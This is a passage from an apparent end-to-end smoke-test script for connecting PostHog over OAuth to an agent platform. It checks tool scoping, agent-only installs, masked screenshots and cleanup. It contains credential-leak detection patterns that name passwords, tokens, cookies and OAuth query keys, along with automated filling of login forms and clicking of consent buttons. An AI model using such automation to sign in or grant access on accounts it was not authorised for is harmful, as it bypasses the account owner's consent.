#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import {
  assertSanitizedEvidence,
  extractProjectSummary,
  parsePosthogLiveArguments,
  parseSanitizedAgentProof,
  PosthogLivePreflightError,
  preflightFailureMessage,
  preparePosthogLiveSmoke,
} from "./posthog-live-lib.mjs";

const TARGET_COMPANY_PREFIX = "PAP";
const TARGET_AGENT_NAME = "CodexCoderPro";
const PROJECT_GET = "project-get";
const PROJECT_SETTINGS_UPDATE = "project-settings-update";
const EXCLUDED_PROJECT_SWITCHERS = new Set(["switch-project", "switch-organization"]);
const DEFAULT_AGENT_TIMEOUT_MS = 15 * 60_000;

class SmokeFailure extends Error {
  constructor(checkpoint, code, details = null) {
    super(`${checkpoint}:${code}`);
    this.name = "SmokeFailure";
    this.checkpoint = checkpoint;
    this.code = code;
    this.details = details;
  }
}

function fail(checkpoint, code, details = null) {
  throw new SmokeFailure(checkpoint, code, details);
}

function asArray(value, key) {
  if (Array.isArray(value)) return value;
  if (value && typeof value === "object" && Array.isArray(value[key])) return value[key];
  return [];
}

function escapeRegex(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function screenshotFile(outputDirectory, name) {
  return path.join(outputDirectory, name);
}

function safeConnectionConfig(connection, expectedProjectId) {
  const methodConfig = connection?.config?.methodConfig;
  if (!methodConfig || typeof methodConfig !== "object" || Array.isArray(methodConfig)) {
    fail("C.connection-detail", "method_config_missing");
  }
  if (connection.config?.connectionMethodKey !== "mcp-oauth") {
    fail("C.connection-detail", "oauth_method_not_recorded");
  }
  if (String(methodConfig.projectId ?? "") !== expectedProjectId) {
    fail("C.connection-detail", "wrong_project_pin");
  }
  if (methodConfig.readOnly !== false || methodConfig.mode !== "tools") {
    fail("C.connection-detail", "unexpected_posthog_scope");
  }
  if ((methodConfig.features ?? "") !== "" || (methodConfig.tools ?? "") !== "") {
    fail("C.connection-detail", "unexpected_tool_filter");
  }
  if (!connection.config?.oauth?.connectedAt) {
    fail("B.oauth-callback", "oauth_not_connected");
  }
}

function assertNoCredentialMaterial(value, secrets, checkpoint) {
  const serialized = JSON.stringify(value);
  for (const secret of secrets) {
    if (secret && serialized.includes(secret)) fail(checkpoint, "credential_material_visible");
  }
  if (/[?&](?:code|state|access_token|refresh_token)=/i.test(serialized)) {
    fail(checkpoint, "oauth_query_material_visible");
  }
  const forbiddenValueKey = /^(?:password|accessToken|access_token|refreshToken|refresh_token|oauthCode|oauth_code|clientSecret|client_secret|cookie|authorizationHeader)$/i;
  const visit = (candidate, seen = new Set()) => {
    if (!candidate || typeof candidate !== "object" || seen.has(candidate)) return;
    seen.add(candidate);
    for (const [key, child] of Object.entries(candidate)) {
      if (forbiddenValueKey.test(key) && child !== null && child !== "") {
        fail(checkpoint, "raw_credential_field_visible");
      }
      visit(child, seen);
    }
  };
  visit(value);
}

async function apiJson(request, baseUrl, method, pathname, data, checkpoint, expectedStatuses = [200]) {
  let response;
  try {
    const origin = new URL(baseUrl).origin;
    response = await request.fetch(new URL(pathname, baseUrl).toString(), {
      method,
      ...(data === undefined ? {} : { data }),
      headers: {
        accept: "application/json",
        origin,
        referer: `${origin}/`,
      },
      timeout: 30_000,
    });
  } catch {
    fail(checkpoint, "request_failed");
  }
  if (!expectedStatuses.includes(response.status())) {
    fail(checkpoint, `http_${response.status()}`);
  }
  try {
    return await response.json();
  } catch {
    fail(checkpoint, "invalid_json");
  }
}

async function waitFor(checkpoint, fn, { timeoutMs = 120_000, intervalMs = 2_000 } = {}) {
  const deadline = Date.now() + timeoutMs;
  let lastValue;
  while (Date.now() < deadline) {
    lastValue = await fn();
    if (lastValue) return lastValue;
    await new Promise((resolve) => setTimeout(resolve, intervalMs));
  }
  fail(checkpoint, "timed_out");
  return lastValue;
}

async function expectVisible(locator, checkpoint, code, timeout = 30_000) {
  try {
    await locator.waitFor({ state: "visible", timeout });
  } catch {
    fail(checkpoint, code);
  }
}

async function gotoPaperclipPage(
  page,
  url,
  readyLocator,
  checkpoint,
  code,
  { attempts = 3, timeout = 15_000 } = {},
) {
  for (let attempt = 1; attempt <= attempts; attempt += 1) {
    try {
      await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30_000 });
      await readyLocator.waitFor({ state: "visible", timeout });
      return;
    } catch {
      if (attempt < attempts) await page.waitForTimeout(500);
    }
  }
  fail(checkpoint, code);
}

async function stabilizeCompanyContext(page, config, companyId) {
  const galleryPath = `/api/companies/${companyId}/tools/gallery`;
  for (let attempt = 1; attempt <= 3; attempt += 1) {
    try {
      const galleryResponsePromise = page.waitForResponse(
        (response) => response.request().method() === "GET"
          && new URL(response.url()).pathname === galleryPath,
        { timeout: 30_000 },
      );
      await page.goto(new URL(`/${TARGET_COMPANY_PREFIX}/apps`, config.baseUrl).toString(), {
        waitUntil: "domcontentloaded",
        timeout: 30_000,
      });
      const response = await galleryResponsePromise;
      if (!response.ok()) continue;
      const posthogAction = page.getByRole("button", {
        name: /^(?:Connect for PostHog|Add another PostHog account)$/,
      }).first();
      await posthogAction.waitFor({ state: "visible", timeout: 30_000 });
      // The company-prefixed route and selected-company provider settle in
      // separate renders. Clicking the tile immediately can carry the prior
      // company's gallery cache into the setup effect and redirect back out.
      await page.waitForTimeout(2_000);
      return;
    } catch {
      if (attempt < 3) await page.waitForTimeout(500);
    }
  }
  fail("A.company-context", "posthog_gallery_context_missing");
}

async function openPosthogSetupFromGallery(page, config, companyId) {
  for (let attempt = 1; attempt <= 3; attempt += 1) {
    await stabilizeCompanyContext(page, config, companyId);
    const addAnother = page.getByRole("button", { name: /^Add another PostHog account$/ }).first();
    const connect = page.getByRole("button", { name: /^Connect for PostHog$/ }).first();
    const action = await addAnother.isVisible().catch(() => false) ? addAnother : connect;
    try {
      await action.click({ timeout: 5_000 });
      await page.getByRole("button", { name: "Sign in with PostHog" }).waitFor({
        state: "visible",
        timeout: 30_000,
      });
      return;
    } catch {
      if (attempt < 3) await page.waitForTimeout(500);
    }
  }
  fail("A.setup-route", "oauth_method_missing");
}

async function safePageState(page, resourceFailures, paperclipOrigin) {
  let current;
  try {
    current = new URL(page.url());
  } catch {
    return { location: "invalid", resourceFailures };
  }
  const bodyText = await page.locator("body").innerText().catch(() => "");
  return {
    location: current.origin === paperclipOrigin
      ? `${current.hostname}${current.pathname}`
      : current.hostname,
    headingCount: await page.getByRole("heading").count().catch(() => 0),
    buttonCount: await page.getByRole("button").count().catch(() => 0),
    methodSignals: {
      posthogSignIn: /sign in with posthog/i.test(bodyText),
      personalApiKey: /personal api key/i.test(bodyText),
      connectApp: /connect an app/i.test(bodyText),
    },
    resourceFailures,
  };
}

async function clickVisibleButton(page, names) {
  for (const name of names) {
    for (const role of ["button", "link"]) {
      const control = page.getByRole(role, { name, exact: false }).filter({ visible: true }).first();
      if (await control.count()) {
        try {
          await control.click({ timeout: 2_000 });
          return true;
        } catch {
          // Provider pages often replace their form between locator creation
          // and click. The next loop re-reads the current DOM.
        }
      }
    }
  }
  return false;
}

async function selectPosthogCloudRegion(page) {
  const region = (process.env.POSTHOG_CLOUD_REGION || "us").trim().toLowerCase();
  if (!new Set(["us", "eu"]).has(region)) {
    fail("B.oauth-callback", "unsupported_cloud_region");
  }
  const expectedHost = `${region}.posthog.com`;
  const links = page.getByRole("link");
  for (let index = 0; index < await links.count(); index += 1) {
    const link = links.nth(index);
    const href = await link.getAttribute("href");
    if (!href) continue;
    try {
      const target = new URL(href, page.url());
      if (target.hostname !== expectedHost) continue;
      await page.goto(target.toString(), { waitUntil: "domcontentloaded", timeout: 30_000 });
      return true;
    } catch {
      // The provider can replace this chooser while the link is being read.
      // The next authorization-loop iteration re-evaluates it.
    }
  }
  return false;
}

async function completePosthogAuthorization(page, config) {
  const paperclipOrigin = new URL(config.baseUrl).origin;
  const providerTimeoutMs = Number(process.env.POSTHOG_PROVIDER_TIMEOUT_MS || 4 * 60_000);
  const deadline = Date.now() + (Number.isFinite(providerTimeoutMs) && providerTimeoutMs > 0
    ? providerTimeoutMs
    : 4 * 60_000);
  let providerState = null;
  let credentialFormSubmitted = false;
  while (Date.now() < deadline) {
    let current;
    try {
      current = new URL(page.url());
    } catch {
      fail("B.oauth-callback", "invalid_navigation_url");
    }
    if (current.origin === paperclipOrigin && current.pathname.includes("/apps/")) return;

    const emailInput = page.locator('input[type="email"], input[name="email"], input[autocomplete="username"]').filter({ visible: true }).first();
    const passwordInput = page.locator('input[type="password"], input[name="password"], input[autocomplete="current-password"]').filter({ visible: true }).first();
    const identityFieldVisible = await emailInput.count() > 0;
    const credentialFieldVisible = await passwordInput.count() > 0;
    const credentialForm = page.locator("form").filter({ has: passwordInput }).first();
    const submitControl = credentialForm.locator('button[type="submit"], input[type="submit"]').filter({ visible: true }).first();
    const consentControlVisible = await page.getByRole("button", {
      name: /^(?:authorize|allow|approve|grant access|accept)$/i,
    }).first().isVisible().catch(() => false);
    const bodyText = await page.locator("body").innerText().catch(() => "");
    const linkHrefs = await page.getByRole("link").evaluateAll((links) =>
      links.map((link) => link.getAttribute("href")).filter(Boolean)
    ).catch(() => []);
    const linkTargets = Array.from(new Set(linkHrefs.map((href) => {
      try {
        const target = new URL(href, current.origin);
        return `${target.hostname}${target.pathname}`;
      } catch {
        return "invalid";
      }
    })));
    providerState = {
      host: current.hostname,
      path: current.pathname.slice(0, 200),
      identityFieldVisible,
      credentialFieldVisible,
      credentialFormVisible: await credentialForm.count() > 0,
      submitControlVisible: await submitControl.count() > 0,
      submitControlDisabled: await submitControl.isDisabled().catch(() => false),
      consentControlVisible,
      alertCount: await page.getByRole("alert").count(),
      headingCount: await page.getByRole("heading").count(),
      buttonCount: await page.getByRole("button").count(),
      linkCount: await page.getByRole("link").count(),
      linkTargets,
      frameCount: page.frames().length,
      semanticSignals: {
        signIn: /\b(?:sign in|log in)\b/i.test(bodyText),
        continue: /\bcontinue\b/i.test(bodyText),
        consent: /\b(?:authorize|allow|approve|grant access|accept)\b/i.test(bodyText),
        loading: /\b(?:loading|preparing|opening|redirecting)\b/i.test(bodyText),
        workspace: /\b(?:workspace|organization|project)\b/i.test(bodyText),
        error: /\b(?:error|invalid|failed|problem|went wrong)\b/i.test(bodyText),
      },
    };
    if (current.hostname === "oauth.posthog.com" && await selectPosthogCloudRegion(page)) {
      await page.waitForTimeout(500);
      continue;
    }
    if (await emailInput.count()) {
      const currentValue = await emailInput.inputValue().catch(() => "");
      if (!currentValue) await emailInput.fill(config.email);
    }

    if (await passwordInput.count()) {
      const currentValue = await passwordInput.inputValue().catch(() => "");
      if (!currentValue) await passwordInput.fill(config.password);
      if (!credentialFormSubmitted) {
        if (await submitControl.count() && !await submitControl.isDisabled().catch(() => true)) {
          await submitControl.click({ noWaitAfter: true, timeout: 2_000 }).catch(() => {});
        } else {
          const submitted = await clickVisibleButton(page, [
            /^sign in$/i,
            /^log in$/i,
            /^login$/i,
            /^continue$/i,
            /sign in with email/i,
            /log in with email/i,
            /login with email/i,
          ]);
          if (!submitted) await passwordInput.press("Enter").catch(() => {});
        }
        credentialFormSubmitted = true;
      }
    } else if (await emailInput.count()) {
      await clickVisibleButton(page, [/^continue$/i, /^next$/i, /continue with email/i, /sign in with email/i]);
    } else {
      await clickVisibleButton(page, [
        /^authorize$/i,
        /^allow$/i,
        /^approve$/i,
        /^grant access$/i,
        /^accept$/i,
        /^continue$/i,
        /^sign in$/i,
        /^log in$/i,
      ]);
    }
    await page.waitForTimeout(500);
  }
  fail("B.oauth-callback", "provider_authorization_timed_out", { providerState });
}

async function safeScreenshot(page, outputPath, config, checkpoint) {
  const current = new URL(page.url());
  if (current.origin !== new URL(config.baseUrl).origin) fail(checkpoint, "screenshot_not_on_paperclip");
  for (const queryKey of ["code", "state", "token", "access_token", "refresh_token"]) {
    if (current.searchParams.has(queryKey)) fail(checkpoint, "credential_query_in_screenshot_url");
  }
  const bodyText = await page.locator("body").innerText();
  if (bodyText.includes(config.password) || /[?&](?:code|state|access_token|refresh_token)=/i.test(bodyText)) {
    fail(checkpoint, "credential_material_in_screenshot");
  }
  await page.screenshot({
    path: outputPath,
    fullPage: true,
    animations: "disabled",
    mask: [page.getByText(config.email, { exact: false })],
  });
}

function catalogFacts(catalog, checkpoint) {
  const active = catalog.filter((entry) => entry.status !== "removed");
  const projectGet = active.find((entry) => entry.toolName === PROJECT_GET);
  const projectSettings = active.find((entry) => entry.toolName === PROJECT_SETTINGS_UPDATE);
  if (!projectGet || !projectGet.isReadOnly) fail(checkpoint, "project_get_missing_or_not_read_only");
  if (!projectSettings || projectSettings.isReadOnly) fail(checkpoint, "project_settings_update_missing_or_not_write");
  for (const excluded of EXCLUDED_PROJECT_SWITCHERS) {
    if (active.some((entry) => entry.toolName === excluded)) fail(checkpoint, `excluded_${excluded}_present`);
  }
  return { active, projectGet, projectSettings };
}

async function finishAgentOnlySetup(request, config, companyId, connectionId, catalog, agentId) {
  const { active } = catalogFacts(catalog, "C.catalog-policy");
  const enabledCatalogEntryIds = active.filter((entry) => entry.isReadOnly).map((entry) => entry.id);
  await apiJson(
    request,
    config.baseUrl,
    "POST",
    `/api/companies/${companyId}/tools/apps/${connectionId}/finish`,
    {
      enabledCatalogEntryIds,
      askFirstCatalogEntryIds: [],
      reviewedCatalogEntryIds: active.filter((entry) => entry.status === "quarantined").map((entry) => entry.id),
      access: { agentIds: [agentId] },
    },
    "C.catalog-policy",
  );
  await apiJson(
    request,
    config.baseUrl,
    "PUT",
    `/api/tool-connections/${connectionId}/installs`,
    { installs: [{ targetType: "agent", targetId: agentId }] },
    "C.agent-install",
  );
}

async function findConnectionIdByName(request, config, companyId, connectionName) {
  const connectionsResponse = await apiJson(
    request,
    config.baseUrl,
    "GET",
    `/api/companies/${companyId}/tools/connections`,
    undefined,
    "F.cleanup-recovery",
  );
  const matching = asArray(connectionsResponse, "connections").filter(
    (connection) => connection.name === connectionName && connection.status !== "archived",
  );
  if (matching.length > 1) fail("F.cleanup-recovery", "duplicate_test_connections");
  return matching[0]?.id ?? null;
}

async function cleanupConnection(
  request,
  config,
  companyId,
  connectionId,
  connectionName,
  { requireInstalledState = true } = {},
) {
  const removed = await apiJson(
    request,
    config.baseUrl,
    "DELETE",
    `/api/tool-connections/${connectionId}`,
    undefined,
    "F.cleanup",
  );
  const receipt = removed.removal;
  if (!receipt || (requireInstalledState && (
    receipt.installsRemoved < 1
    || receipt.appProfileBindingsRemoved < 1
    || receipt.credentialRefsCleared + receipt.secretsRevoked < 1
    || !["deleted", "archived"].includes(receipt.appProfile)
  ))) {
    fail("F.cleanup", "incomplete_removal_receipt");
  }

  const connectionsResponse = await apiJson(
    request,
    config.baseUrl,
    "GET",
    `/api/companies/${companyId}/tools/connections`,
    undefined,
    "F.cleanup-verification",
  );
  const remaining = asArray(connectionsResponse, "connections").filter(
    (connection) => connection.name === connectionName && connection.status !== "archived",
  );
  if (remaining.length > 0) fail("F.cleanup-verification", "test_connection_remains");

  const profilesResponse = await apiJson(
    request,
    config.baseUrl,
    "GET",
    `/api/companies/${companyId}/tools/profiles`,
    undefined,
    "F.cleanup-verification",
  );
  if (asArray(profilesResponse, "profiles").some((profile) => profile.profileKey === `app:${connectionId}` && profile.status === "active")) {
    fail("F.cleanup-verification", "active_profile_remains");
  }
  const pendingResponse = await apiJson(
    request,
    config.baseUrl,
    "GET",
    `/api/companies/${companyId}/tools/action-requests?status=pending`,
    undefined,
    "F.cleanup-verification",
  );
  if (asArray(pendingResponse, "actionRequests").some((item) => (item.connectionId ?? item.request?.connectionId) === connectionId)) {
    fail("F.cleanup-verification", "pending_action_remains");
  }
  return {
    credentialsTornDown: receipt.credentialRefsCleared + receipt.secretsRevoked > 0,
    accessBindingsRemoved: receipt.appProfileBindingsRemoved,
    installsRemoved: receipt.installsRemoved,
    appProfile: receipt.appProfile,
    pendingActions: 0,
    remainingConnections: 0,
  };
}

async function runSmoke({ config, chromium }) {
  const startedAt = new Date();
  const runKey = startedAt.toISOString().replace(/[:.]/g, "-");
  const connectionName = `PostHog live self-test ${startedAt.toISOString()}`;
  const outputDirectory = process.env.POSTHOG_EVIDENCE_DIR
    ? path.resolve(process.env.POSTHOG_EVIDENCE_DIR)
    : path.join(process.env.PAPERCLIP_RUN_SCRATCH_DIR || process.cwd(), `posthog-live-${runKey}`);
  await mkdir(outputDirectory, { recursive: true });

  const summary = {
    schemaVersion: 1,
    smoke: "posthog_mcp_live",
    passed: false,
    startedAt: startedAt.toISOString(),
    completedAt: null,
    target: { companyPrefix: TARGET_COMPANY_PREFIX, projectId: config.projectId },
    connection: null,
    catalog: null,
    boardTest: null,
    freshRun: null,
    cleanup: null,
    screenshots: [],
    failure: null,
  };

  let browser;
  let context;
  let page;
  let connectionId = null;
  let companyId = null;
  let cleanupComplete = false;
  let caughtFailure = null;
  let activeCheckpoint = "A.browser-launch";
  const resourceFailures = [];

  try {
    browser = await chromium.launch({ headless: process.env.POSTHOG_SMOKE_HEADED !== "1" });
    context = await browser.newContext({
      viewport: { width: 1440, height: 1000 },
      acceptDownloads: false,
      serviceWorkers: "block",
    });
    page = await context.newPage();
    page.on("requestfailed", (request) => {
      if (!["document", "script", "stylesheet", "xhr", "fetch"].includes(request.resourceType())) return;
      try {
        const target = new URL(request.url());
        if (target.origin !== new URL(config.baseUrl).origin) return;
        resourceFailures.push({
          target: `${target.hostname}${target.pathname}`,
          resourceType: request.resourceType(),
          error: request.failure()?.errorText ?? "unknown",
        });
        if (resourceFailures.length > 12) resourceFailures.shift();
      } catch {
        // Ignore malformed resource URLs rather than copying them into evidence.
      }
    });

    activeCheckpoint = "A.paperclip-login";
    await gotoPaperclipPage(
      page,
      new URL("/auth?next=/", config.baseUrl).toString(),
      page.locator("#email"),
      "A.paperclip-login",
      "email_field_missing",
    );
    await page.locator("#email").fill(config.email);
    await page.locator("#password").fill(config.password);
    const loginResponsePromise = page.waitForResponse((response) =>
      response.request().method() === "POST" && new URL(response.url()).pathname === "/api/auth/sign-in/email",
    );
    await page.getByRole("button", { name: /^sign in$/i }).click();
    const loginResponse = await loginResponsePromise;
    if (!loginResponse.ok()) fail("A.paperclip-login", `http_${loginResponse.status()}`);
    await page.waitForURL((url) => url.pathname !== "/auth", { timeout: 30_000 }).catch(() => {
      fail("A.paperclip-login", "login_redirect_missing");
    });

    activeCheckpoint = "A.company-selection";
    const companiesResponse = await apiJson(context.request, config.baseUrl, "GET", "/api/companies", undefined, "A.company-selection");
    const company = asArray(companiesResponse, "companies").find((candidate) => candidate.issuePrefix === TARGET_COMPANY_PREFIX);
    if (!company) fail("A.company-selection", "pap_company_missing");
    companyId = company.id;

    activeCheckpoint = "C.agent-scope";
    const agentsResponse = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/companies/${companyId}/agents`,
      undefined,
      "C.agent-scope",
    );
    const agent = asArray(agentsResponse, "agents").find((candidate) => candidate.name === TARGET_AGENT_NAME);
    if (!agent) fail("C.agent-scope", "codex_coder_pro_missing");

    activeCheckpoint = "A.setup-route";
    await openPosthogSetupFromGallery(page, config, companyId);
    await expectVisible(page.getByRole("button", { name: "Use a personal API key" }), "A.setup-route", "api_key_method_missing");

    activeCheckpoint = "B.oauth-setup";
    await page.getByRole("button", { name: "Sign in with PostHog" }).click();
    const nameInput = page.locator('input[placeholder="My app"]');
    await nameInput.fill(connectionName);
    await page.locator('input[placeholder="12345"]').fill(config.projectId);
    const readOnlyScope = page.locator("div").filter({ hasText: /^Read-only mode/ }).filter({ has: page.getByRole("switch") }).first();
    const readOnlySwitch = readOnlyScope.getByRole("switch");
    if (await readOnlySwitch.getAttribute("aria-checked") !== "false") fail("B.oauth-setup", "read_only_default_changed");
    await page.getByText("Advanced", { exact: true }).click();
    const featuresInput = page.locator("label", { hasText: "Feature groups" }).locator("..").locator("textarea");
    const toolsInput = page.locator("label", { hasText: "Individual tools" }).locator("..").locator("textarea");
    if (await featuresInput.inputValue() !== "" || await toolsInput.inputValue() !== "") {
      fail("B.oauth-setup", "tool_filters_not_blank");
    }
    const responseMode = page.locator("label", { hasText: "Tool response mode" }).locator("..").locator("select");
    if (await responseMode.inputValue() !== "tools") fail("B.oauth-setup", "individual_tools_mode_not_selected");

    activeCheckpoint = "B.oauth-start";
    const connectResponsePromise = page.waitForResponse(
      (response) => {
        const target = new URL(response.url());
        return response.request().method() === "POST"
          && target.pathname === `/api/companies/${companyId}/tools/apps/connect`;
      },
      { timeout: 120_000 },
    );
    await page.getByRole("button", { name: "Continue to sign in" }).click({ noWaitAfter: true });
    const connectResponse = await connectResponsePromise;
    if (!connectResponse.ok()) fail("B.oauth-start", `http_${connectResponse.status()}`);
    let connectResult = null;
    try {
      connectResult = await connectResponse.json();
    } catch {
      // A successful create immediately redirects the page to PostHog. Chromium
      // can discard that response body during the cross-origin navigation, so
      // recover the uniquely named draft instead of orphaning it.
    }
    connectionId = connectResult?.connectionId ?? await waitFor(
      "B.oauth-start",
      () => findConnectionIdByName(context.request, config, companyId, connectionName),
      { timeoutMs: 15_000, intervalMs: 500 },
    );
    if (typeof connectionId !== "string" || !connectionId) fail("B.oauth-start", "connection_id_missing");

    activeCheckpoint = "B.oauth-callback";
    await completePosthogAuthorization(page, config);
    const cleanSetupPath = `/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/setup`;
    await gotoPaperclipPage(
      page,
      new URL(cleanSetupPath, config.baseUrl).toString(),
      page.getByText("PostHog connected", { exact: true }),
      "B.oauth-callback",
      "connected_state_missing",
      { attempts: 3, timeout: 30_000 },
    );

    activeCheckpoint = "C.connection-detail";
    let connection = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/tool-connections/${connectionId}`,
      undefined,
      "C.connection-detail",
    );
    safeConnectionConfig(connection, config.projectId);
    assertNoCredentialMaterial(connection, [config.password], "C.connection-detail");
    summary.connection = {
      id: connectionId,
      name: connectionName,
      authentication: "oauth",
      projectId: config.projectId,
      status: connection.status,
      healthStatus: connection.healthStatus,
    };
    const connectedShot = "01-connected-setup.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, connectedShot), config, "F.connected-screenshot");
    summary.screenshots.push(connectedShot);

    activeCheckpoint = "C.catalog-policy";
    let catalogResponse = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/tool-connections/${connectionId}/catalog`,
      undefined,
      "C.catalog-policy",
    );
    let catalog = asArray(catalogResponse, "catalog");
    let facts = catalogFacts(catalog, "C.catalog-policy");
    await finishAgentOnlySetup(context.request, config, companyId, connectionId, catalog, agent.id);

    const health = await apiJson(
      context.request,
      config.baseUrl,
      "POST",
      `/api/tool-connections/${connectionId}/health-check`,
      {},
      "C.health-check",
    );
    if (health.connection?.healthStatus !== "healthy") fail("C.health-check", "connection_not_healthy");
    const refreshed = await apiJson(
      context.request,
      config.baseUrl,
      "POST",
      `/api/tool-connections/${connectionId}/catalog/refresh`,
      {},
      "C.catalog-refresh",
    );
    catalog = asArray(refreshed, "catalog");
    facts = catalogFacts(catalog, "C.catalog-refresh");
    await finishAgentOnlySetup(context.request, config, companyId, connectionId, catalog, agent.id);

    connection = await apiJson(context.request, config.baseUrl, "GET", `/api/tool-connections/${connectionId}`, undefined, "C.connection-detail");
    safeConnectionConfig(connection, config.projectId);
    if (connection.status !== "active" || connection.healthStatus !== "healthy") {
      fail("C.connection-detail", "connection_not_active_and_healthy");
    }
    assertNoCredentialMaterial(connection, [config.password], "C.connection-detail");
    summary.connection.status = connection.status;
    summary.connection.healthStatus = connection.healthStatus;

    const uniqueConnections = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/companies/${companyId}/tools/connections`,
      undefined,
      "C.connection-detail",
    );
    if (asArray(uniqueConnections, "connections").filter((candidate) => candidate.name === connectionName).length !== 1) {
      fail("C.connection-detail", "duplicate_connection_detected");
    }

    const installs = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/tool-connections/${connectionId}/installs`,
      undefined,
      "C.agent-install",
    );
    const installRows = asArray(installs, "installs");
    if (installRows.length !== 1 || installRows[0].targetType !== "agent" || installRows[0].targetId !== agent.id) {
      fail("C.agent-install", "install_not_agent_only");
    }

    const testAgents = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/tool-connections/${connectionId}/test-agents`,
      undefined,
      "C.effective-policy",
    );
    const testAgent = asArray(testAgents, "agents").find((candidate) => candidate.id === agent.id);
    const projectGetAccess = testAgent?.effectiveAccess?.tools?.find((tool) => tool.toolName === PROJECT_GET);
    const projectSettingsAccess = testAgent?.effectiveAccess?.tools?.find((tool) => tool.toolName === PROJECT_SETTINGS_UPDATE);
    if (projectGetAccess?.decision !== "allowed" || projectSettingsAccess?.decision !== "off") {
      fail("C.effective-policy", "unexpected_effective_decision");
    }
    summary.catalog = {
      discoveredCount: refreshed.discoveredCount,
      projectGet: { catalogEntryId: facts.projectGet.id, toolName: PROJECT_GET, decision: "allowed" },
      projectSettingsUpdate: { catalogEntryId: facts.projectSettings.id, toolName: PROJECT_SETTINGS_UPDATE, decision: "off" },
      excludedToolsAbsent: [...EXCLUDED_PROJECT_SWITCHERS],
      accessAgentId: agent.id,
      installAgentId: agent.id,
      healthCheck: "healthy",
      catalogRefresh: "succeeded",
    };

    activeCheckpoint = "C.permissions-ui";
    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/permissions`, config.baseUrl).toString(),
      page.getByText("Who can use it", { exact: true }),
      "C.permissions-ui",
      "permissions_panel_missing",
    );
    const projectGetPermission = page.locator(`[data-action-id="${facts.projectGet.id}"] select`);
    const projectSettingsPermission = page.locator(`[data-action-id="${facts.projectSettings.id}"] select`);
    await expectVisible(projectGetPermission, "C.permissions-ui", "project_get_permission_missing");
    await expectVisible(projectSettingsPermission, "C.permissions-ui", "project_settings_permission_missing");
    if (await projectGetPermission.inputValue() !== "allowed" || await projectSettingsPermission.inputValue() !== "off") {
      fail("C.permissions-ui", "permissions_ui_mismatch");
    }
    const permissionsShot = "02-scoped-permissions.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, permissionsShot), config, "F.permissions-screenshot");
    summary.screenshots.push(permissionsShot);

    activeCheckpoint = "D.test-panel";
    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/test`, config.baseUrl).toString(),
      page.getByLabel("Choose which agent to test as"),
      "D.test-panel",
      "agent_picker_missing",
    );
    await page.getByLabel("Choose which agent to test as").click();
    await page.getByLabel("Search agents").fill(TARGET_AGENT_NAME);
    await page.getByRole("button", { name: new RegExp(`^${escapeRegex(TARGET_AGENT_NAME)}`) }).click();
    await page.getByLabel("Find an action").fill(PROJECT_GET);
    const projectGetTitle = facts.projectGet.title ?? facts.projectGet.toolName;
    const actionRow = page.locator("button").filter({ hasText: projectGetTitle }).filter({ hasText: "Allowed" }).first();
    await expectVisible(actionRow, "D.test-panel", "project_get_allowed_row_missing");
    await actionRow.click();
    await expectVisible(page.getByText("This action takes no inputs."), "D.test-panel", "empty_input_form_missing");

    activeCheckpoint = "D.project-get";
    const boardTestStartedAt = Date.now();
    const testCallResponsePromise = page.waitForResponse((response) =>
      response.request().method() === "POST"
      && new URL(response.url()).pathname === `/api/tool-connections/${connectionId}/test-calls`,
    );
    await page.getByRole("button", { name: /^run$/i }).click();
    const testCallResponse = await testCallResponsePromise;
    if (!testCallResponse.ok()) fail("D.project-get", `http_${testCallResponse.status()}`);
    let testCall;
    try {
      testCall = await testCallResponse.json();
    } catch {
      fail("D.project-get", "invalid_json");
    }
    let testCallInput;
    try {
      testCallInput = testCallResponse.request().postDataJSON();
    } catch {
      fail("D.project-get", "request_body_unavailable");
    }
    if (testCallInput?.agentId !== agent.id
      || testCallInput?.toolName !== PROJECT_GET
      || !testCallInput.parameters
      || typeof testCallInput.parameters !== "object"
      || Array.isArray(testCallInput.parameters)
      || Object.keys(testCallInput.parameters).length !== 0) {
      fail("D.project-get", "nonempty_or_unexpected_input");
    }
    if (testCall.decision !== "allowed" || testCall.error || typeof testCall.invocationId !== "string") {
      fail("D.project-get", "gateway_call_not_allowed");
    }
    const boardProject = extractProjectSummary(testCall.result, config.projectId);
    if (!boardProject?.name) fail("D.project-get", "project_result_missing");
    await expectVisible(page.getByText(/^Worked\./), "D.project-get", "success_result_missing");
    const boardShot = "03-board-project-get.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, boardShot), config, "F.board-test-screenshot");
    summary.screenshots.push(boardShot);
    summary.boardTest = {
      catalogEntryId: facts.projectGet.id,
      toolName: PROJECT_GET,
      invocationId: testCall.invocationId,
      decision: testCall.decision,
      httpStatus: testCallResponse.status(),
      resultStatus: "succeeded",
      project: boardProject,
      durationMs: Date.now() - boardTestStartedAt,
    };

    activeCheckpoint = "E.create-proof-issue";
    const parentIssueId = process.env.POSTHOG_PROOF_PARENT_ISSUE_ID || process.env.PAPERCLIP_TASK_ID;
    if (!parentIssueId) fail("E.create-proof-issue", "parent_issue_id_missing");
    const child = await apiJson(
      context.request,
      config.baseUrl,
      "POST",
      `/api/issues/${parentIssueId}/children`,
      {
        title: `PostHog installed-tool proof ${startedAt.toISOString()}`,
        description: [
          "Invoke exactly one installed PostHog action: the read-only upstream `project-get` tool, with an empty `{}` input.",
          `Verify the returned project ID is exactly ${config.projectId} and make no PostHog mutations.`,
          "Then post exactly one JSON object with keys `projectId`, `projectName`, and `invocationId` (the Paperclip invocation ID), and mark this issue done.",
          "Do not report tokens, cookies, authorization data, request headers, raw tool payloads, or any other fields.",
        ].join("\n\n"),
        status: "todo",
        workMode: "standard",
        priority: "medium",
        assigneeAgentId: agent.id,
        acceptanceCriteria: [
